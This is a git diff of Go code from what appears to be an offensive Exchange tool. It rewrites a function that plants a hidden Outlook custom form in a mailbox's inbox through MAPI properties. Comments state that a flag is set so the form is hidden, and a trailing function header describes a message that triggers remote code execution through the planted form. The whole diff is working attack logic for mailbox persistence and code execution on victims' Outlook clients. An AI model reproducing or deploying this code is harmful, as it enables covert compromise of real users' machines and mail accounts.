@@ -83,7 +83,7 @@ func CreateFormAttachmentTemplate(folderid, messageid []byte, pstr string) error
 //CreateFormMessage creates the associate message that holds the form data
 func CreateFormMessage(suffix string) ([]byte, error) {
 	folderid := mapi.AuthSession.Folderids[mapi.INBOX]
-	propertyTagx := make([]mapi.TaggedPropertyValue, 17)
+	propertyTagx := make([]mapi.TaggedPropertyValue, 8)
 	var err error
 
 	propertyTagx[0] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagMessageClass, PropertyValue: utils.UniString("IPM.Microsoft.FolderDesign.FormsDescription")}
@@ -95,15 +95,23 @@ func CreateFormMessage(suffix string) ([]byte, error) {
 	propertyTagx[6] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagSendOutlookRecallReport, PropertyValue: []byte{0xFF}} //set to true for form to be hidden :)
 	propertyTagx[7] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6830, PropertyValue: append([]byte("&Open"), []byte{0x00}...)}
 
+	//create the message in the "associated" contents table for the inbox
+	msg, err := mapi.CreateAssocMessage(folderid, propertyTagx)
+
+	if err != nil {
+		return nil, err
+	}
+
+	propertyTagx = make([]mapi.TaggedPropertyValue, 5)
 	data := utils.EncodeNum(uint32(2))                               //COUNT as a uint32 instead of the usual uint16
 	data = append(data, utils.EncodeNum(uint64(281487861678082))...) //static
 	data = append(data, utils.EncodeNum(uint64(281496451612674))...) //static
-	propertyTagx[8] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag682C, PropertyValue: data}
+	propertyTagx[0] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag682C, PropertyValue: data}
 	data = []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
-	propertyTagx[9] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6831, PropertyValue: append(utils.COUNT(len(data)), data...)}
+	propertyTagx[1] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6831, PropertyValue: append(utils.COUNT(len(data)), data...)}
 	data = []byte{0x0C, 0x0D, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0x00, 0x6B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00}
-	propertyTagx[10] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6832, PropertyValue: append(utils.COUNT(len(data)), data...)}
-	propertyTagx[11] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6B00, PropertyValue: append([]byte("1112110010000000"), []byte{0x00}...)}
+	propertyTagx[2] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6832, PropertyValue: append(utils.COUNT(len(data)), data...)}
+	propertyTagx[3] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6B00, PropertyValue: append([]byte("1112110010000000"), []byte{0x00}...)}
 
 	data, err = utils.ReadFile("templates/img0.bin")
 	if err != nil {
@@ -114,8 +122,10 @@ func CreateFormMessage(suffix string) ([]byte, error) {
 		return nil, err
 	}
 	//the small icon for the message
-	propertyTagx[12] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6823, PropertyValue: append(utils.COUNT(len(data)), data...)}
+	propertyTagx[4] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6823, PropertyValue: append(utils.COUNT(len(data)), data...)}
+	_, err = mapi.SetMessageProperties(folderid, msg.MessageID, propertyTagx)
 
+	propertyTagx = make([]mapi.TaggedPropertyValue, 4)
 	data, err = utils.ReadFile("templates/img1.bin")
 	if err != nil {
 		utils.Error.Println(err)
@@ -125,18 +135,14 @@ func CreateFormMessage(suffix string) ([]byte, error) {
 		return nil, err
 	}
 	//the large icon for the message
-	propertyTagx[13] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6824, PropertyValue: append(utils.COUNT(len(data)), data...)}
-	propertyTagx[14] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6827, PropertyValue: append([]byte("en"), []byte{0x00}...)}                                                                               //Set language value
-	propertyTagx[15] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagOABCompressedSize, PropertyValue: []byte{0x20, 0xF0, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}} //fixed value, not sure how this is calculated or if it can be kept static.
-	propertyTagx[16] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagOABDN, PropertyValue: utils.CookieGen()}                                                                                                  //generate a random GUID
+	propertyTagx[0] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6824, PropertyValue: append(utils.COUNT(len(data)), data...)}
+	propertyTagx[1] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTag6827, PropertyValue: append([]byte("en"), []byte{0x00}...)}                                                                               //Set language value
+	propertyTagx[2] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagOABCompressedSize, PropertyValue: []byte{0x20, 0xF0, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}} //fixed value, not sure how this is calculated or if it can be kept static.
+	propertyTagx[3] = mapi.TaggedPropertyValue{PropertyTag: mapi.PidTagOABDN, PropertyValue: utils.CookieGen()}                                                                                                  //generate a random GUID
 
-	//create the message in the "associated" contents table for the inbox
-	msg, err := mapi.CreateAssocMessage(folderid, propertyTagx)
+	_, err = mapi.SetMessageProperties(folderid, msg.MessageID, propertyTagx)
 
-	if err != nil {
-		return nil, err
-	}
-	return msg.MessageID, nil
+	return msg.MessageID, err
 }
 
 //CreateFormTriggerMessage creates a valid message to trigger RCE through an existing form
